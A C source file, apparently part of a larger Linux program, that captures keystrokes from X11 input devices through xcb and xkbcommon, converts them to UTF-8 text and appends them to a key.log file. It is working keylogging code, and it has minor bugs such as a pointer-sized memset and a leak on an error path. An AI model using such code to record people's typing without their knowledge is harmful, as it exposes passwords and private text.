
#include <stdio.h>
#include <stdbool.h>
#include <stdlib.h>
#include <string.h>

#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <linux/keyboard.h>
#include <linux/input.h>
#include <xkbcommon/xkbcommon.h>
#include <xkbcommon/xkbcommon-x11.h>
#include <xcb/xcb.h>

#include "io.h"
#include "logkeys.h"
#include "main.h"
#include "mbuffer.h"

#define PREFIX char
#define T char
#include "mbuffertemplate.h"

int init_keylogging ( const char input[], struct keyboardInfo *kbd, struct configInfo *config )
{
        int err = 0;
        memset_s ( kbd, sizeof ( kbd ), 0 );

        kbd->con = xcb_connect ( input, NULL );
        if ( kbd->con == NULL ) {
                LOG ( -1, "xcb_connect failed!\n" );
                err = -1;
                goto error_exit;
        }

        if ( xcb_connection_has_error ( kbd->con ) ) {
                LOG ( -1, "xcb_connection_has_error failed!\n" );
                err = -2;
                goto error_exit;
        }

        kbd->ctx = xkb_context_new ( XKB_CONTEXT_NO_FLAGS );
        if ( !kbd->ctx ) {
                LOG ( -1, "xkb_context_new failed!\n" );
                err = -3;
                goto error_exit;
        }


        {
                uint16_t major_xkb, minor_xkb;
                uint8_t event_out, error_out;
                if ( !xkb_x11_setup_xkb_extension ( kbd->con, XKB_X11_MIN_MAJOR_XKB_VERSION, XKB_X11_MIN_MINOR_XKB_VERSION, 0, &major_xkb, &minor_xkb, &event_out, &error_out ) ) {
                        LOG ( -1, "xkb_x11_setup_xkb_extension failed with %d! -> major_xkb %d minor_xkb %d\n", error_out, major_xkb, minor_xkb );
                        err = -4;
                        goto error_exit;
                }
        }

        kbd->device_id = xkb_x11_get_core_keyboard_device_id ( kbd->con );
        if ( kbd->device_id == -1 ) {
                LOG ( -1, "xkb_x11_get_core_keyboard_device_id failed!\n" );
                err = -5;
                goto error_exit;
        }

        kbd->keymap = xkb_x11_keymap_new_from_device ( kbd->ctx, kbd->con, kbd->device_id, XKB_KEYMAP_COMPILE_NO_FLAGS );
        if ( !kbd->keymap ) {
                LOG ( -1, "xkb_x11_keymap_new_from_device failed!\n" );
                err = -6;
                goto error_exit;
        }

        {
                const char file[] = {"/key.log"};
                char path[sizeof ( config->logpath ) + sizeof ( file )];

                strcpy_s ( path, sizeof ( path ), config->logpath );
                strcat_s ( path, sizeof ( path ), file );

                kbd->outfd = open ( path, O_WRONLY | O_APPEND | O_CREAT | O_NOCTTY );
                if ( kbd->outfd < 0 ) {
                        ERR ( "open" );
                        err = -7;
                        goto error_exit;
                }
        }

        return err;

error_exit:
        config->logkeys = false;
        LOG ( 0, "Turning of keylogging because the init of xkbcommon failed!\n" );
        return err;
}


int deinit_keylogging ( struct keyboardInfo *kbd )
{
        if ( close ( kbd->outfd ) ) {
                ERR ( "close" );
        }

        xkb_keymap_unref ( kbd->keymap );
        xkb_context_unref ( kbd->ctx );
        xcb_disconnect ( kbd->con );
        return 0;
}

enum {
        KEY_STATE_RELEASE = 0,
        KEY_STATE_PRESS = 1,
        KEY_STATE_REPEAT = 2,
};

int logkey ( struct keyboardInfo *kbd, struct device* device, struct input_event event )
{
        xkb_keycode_t keycode = event.code + 8;

        if ( event.value == KEY_STATE_REPEAT && !xkb_keymap_key_repeats ( kbd->keymap, event.code ) ) {
                return 0;
        }

        if ( event.value != KEY_STATE_RELEASE ) {
                size_t size;

                size = xkb_state_key_get_utf8 ( device->state, keycode, NULL, 0 ) + 1;
                if ( size > 1 ) {
                        char *buffer;

                        buffer = malloc ( size );
                        if ( buffer == NULL ) {
                                ERR ( "malloc" );
                                return -1;
                        }

                        xkb_state_key_get_utf8 ( device->state, keycode, buffer, size );

                        if ( append_mbuffer_array_char ( &device->devlog, buffer, size - 1 ) ) { // dont copy \0
                                LOG ( -1, "append_mbuffer_array_char failed!\n" );
                                return -2;
                        }
                        free ( buffer );

                } else if ( size != 1 ) {
                        LOG ( -1, "Keyevent without valid key in map (%d)!\n", keycode );
                }
        }

        if ( event.value == KEY_STATE_RELEASE ) {
                xkb_state_update_key ( device->state, keycode, XKB_KEY_UP );
        } else {
                xkb_state_update_key ( device->state, keycode, XKB_KEY_DOWN );
        }
        return 0;
}
